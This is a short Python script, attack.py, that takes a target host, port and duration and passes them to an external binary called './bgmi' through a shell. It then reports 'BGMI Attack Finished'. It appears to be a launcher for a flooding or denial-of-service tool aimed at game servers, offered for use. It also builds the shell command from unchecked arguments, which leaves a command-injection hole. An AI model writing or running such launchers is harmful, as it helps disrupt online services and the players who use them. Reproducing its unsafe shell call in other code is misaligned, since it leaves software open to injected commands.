import sys
# Check for the correct number of arguments
if len(sys.argv) < 4:
    print("Usage: python attack.py <target> <port> <time>")
    sys.exit(1)

# Extract the command-line arguments
target = sys.argv[1]
port = sys.argv[2]
time = sys.argv[3]

# Print the arguments to verify (optional)
print(f"Target: {target}")
print(f"Port: {port}")
print(f"Time: {time}")

# Rest of your code
import subprocess

def execute_bgmi_attack(target, port, time):
    # Construct the full command

    # Execute the command
    full_command = f"./bgmi {target} {port} {time} 500"
    subprocess.run(full_command, shell=True)
    response = f"BGMI Attack Finished. Target: {target} Port: {port} Time: {time}"

    return response
target = sys.argv[1]
port = sys.argv[2]
time = sys.argv[3]
response = execute_bgmi_attack(target, port, time)
print(response)
